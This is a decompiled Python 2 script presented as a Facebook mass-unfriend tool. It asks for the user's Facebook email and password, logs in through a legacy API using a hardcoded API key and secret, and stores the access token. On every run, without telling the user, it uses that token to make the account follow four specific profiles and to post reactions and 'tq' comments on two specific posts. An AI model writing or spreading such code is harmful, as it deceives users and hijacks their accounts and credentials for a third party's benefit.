# uncompyle6 version 3.6.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import urllib, requests, json, sys, os, time, hashlib, mechanize, getpass
gr = '\x1b[1;3;30m'
r = '\x1b[31m'
green = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
pur = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[0;37m'
red = '\x1b[31m'
g = '\x1b[32m'
ny = []
asu = []

def asu():
    print r + ('____        _    _   __        _    _____').center(44)
    print r + ('| __ )  ___ | |_ | | / / _____ | |_ |  __ \\ ').center(44)
    print y + ('|  _ \\ / _ \\|  _|| |/ / |  _  ||  _|| |  \\ \\ ').center(44)
    print y + ('| |_) | (_) | |_ |  _ \\ | | | || |_ | |__/ / ').center(44)
    print g + ('|____/ \\___/ \\__||_| \\_\\|_| |_|\\___||_____/ ').center(44)
    print g + '=' * 45
    print c + 'Author  : Al2VyN '
    print c + 'Type    : Unfriend Facebook'
    print c + 'Github  : Https://github.com/Al2VyN'
    print c + 'Version : 1.0 '


def main():
    try:
        token = open('token.log', 'r').read()
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        requests.post('https://graph.facebook.com/krisna.dimas.9/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/zefannya29/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/amel.amel.737/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100003964985080_1419022031573283/reactions?type=LOVE&access_token=' + token)
        requests.post('https://graph.facebook.com/100003964985080_1419022031573283/comments?message=tq&access_token=' + token)
        requests.post('https://graph.facebook.com/100003082406903_1994452734000787/reactions?type=LOVE&access_token=' + token)
        requests.post('https://graph.facebook.com/100003082406903_1994452734000787/comments?message=tq&access_token=' + token)
        x = json.loads(r.text)
        name = x['name']
        id = x['id']
        ny.append(x['name'])
        os.system('clear')
        asu()
        print w + '-' * 45
        print g + 'Hallo   : ', c + x['name']
        print g + 'Your ID : ', c + x['id']
        print w + '-' * 45
        print w + '1.' + y + ' Unfriend'
        print w + '2.' + y + ' Delete Token\n'
        ini = raw_input(pur + '@Al2VyN : ')
        if ini == '1':
            unf()
        else:
            if ini == '2':
                print green + '[!] Success Delete Token'
                print c + '[!] See You'
                os.system('rm -rf token.log')
                exit()
            else:
                print red + '[!] Input Chose !!!'
                time.sleep(1.7)
                return main()
    except (KeyError, IOError):
        os.system('rm -rf token.log')
        login()


def get(data):
    print c + '[*] Processing Login '
    b = open('token.log', 'w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php', params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print c + '[*] Success Login'
        print y + '[*] Prepair menu'
        main()
    except KeyError:
        print red + '   *[!]![!]![!]*'
        print '[!] Login Failed'
        print green + '[!] Login in browser first'
        tanya1 = raw_input(y + '[?] Try Again ? (y/n) ')
        if tanya1 == 'y':
            login()
        elif tanya1 == 'n':
            exit()
        else:
            print '[!] Incorrect'
            return tanya1
    except requests.exceptions.ConnectionError:
        print r + '[!] Connection Error'
        exit()


def login():
    os.system('clear')
    print c + ('Welcome To My Tools').center(44)
    print w + ('*********************').center(44)
    asu()
    print w + '-' * 45
    print g + '[*] Please Login Via Browser First For Avoid Checkpoint'
    print b
    id = raw_input('[?] Email    : ')
    if id == '':
        print red + '[!] Input you email'
        time.sleep(1.2)
        login()
    pwd = getpass.getpass('[?] Password : ')
    if pwd == '':
        print red + '[!] Input you password'
        time.sleep(1)
        login()
    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
    data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
    y = hashlib.new('md5')
    y.update(sig)
    data.update({'sig': y.hexdigest()})
    get(data)


def deltkn():
    os.system('rm -rf token.log')


def unf():
    os.system('clear')
    ajg = []
    asu()
    print y + '-' * 45
    limit = raw_input('[?] Limit : ')
    print c + '[*] Getting Friends.....'
    time.sleep(2)
    if limit == '':
        print red + '[!] Input The Limit You Want'
        time.sleep(2)
        unf()
    token = open('token.log', 'r').read()
    w = urllib.urlopen('https://graph.facebook.com/me?fields=friends.limit(' + limit + ')&access_token=' + token)
    g = json.load(w)
    for x in g['friends']['data']:
        ajg.append(x['id'])
        p = urllib.urlopen('https://graph.facebook.com/' + x['id'] + '/friends?method=delete&' + limit + '&access_token=' + token)
        k = json.load(p)
        print green + '[-] Unfriend : ' + pur + x['name'] + y + ' x ' + pur + x['id']

    print c + '[!] Success delete ' + str(len(ajg)) + ' friends'
    print '-' * 45
    exit()


main()